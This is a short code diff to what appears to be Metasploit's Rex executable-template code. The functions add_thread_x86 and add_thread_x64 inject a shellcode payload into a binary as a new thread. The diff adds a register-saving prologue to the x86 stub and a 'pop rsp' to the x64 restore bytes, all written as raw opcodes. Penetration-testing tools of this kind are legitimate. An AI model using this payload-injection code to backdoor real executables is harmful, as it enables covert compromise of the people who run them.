@@ -41,6 +41,7 @@ module Rex
             end
 
             def add_thread_x86(payload)
+              stackpreserve = "\x90\x90\x60\x9c"	# AUTOMATED ASM: x86 = ['nop', 'nop', 'pushad', 'pushfd']
               shellcode = "\xE8\xB7\xFF\xFF\xFF"	# AUTOMATED ASM: x86 = ['call 0xffffffbc']
               shellcode += payload
 
@@ -81,7 +82,7 @@ module Rex
               thread += "\xe9"	# AUTOMATED ASM: x86 = ['invalid']
 
               thread += [shellcode.length].pack("V")
-              return thread + shellcode
+              return stackpreserve + thread + shellcode
             end
 
             def add_thread_x64(payload)
@@ -230,7 +231,7 @@ module Rex
 
                   # stackrestore
                   "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +	# AUTOMATED ASM: x64 = ['popfq', 'pop r15', 'pop r14', 'pop r13', 'pop r12', 'pop r11', 'pop r10', 'pop r9']
-                  "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"	# AUTOMATED ASM: x64 = ['pop r8', 'pop rbp', 'pop rdi', 'pop rsi', 'pop rdx', 'pop rcx', 'pop rbx', 'pop rax']
+                  "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"	# AUTOMATED ASM: x64 = ['pop r8', 'pop rbp', 'pop rsp', 'pop rdi', 'pop rsi', 'pop rdx', 'pop rcx', 'pop rbx', 'pop rax']
 
               thread += "\xe9"	# AUTOMATED ASM: x64 = ['invalid']
               thread += [shellcode.length].pack("V")
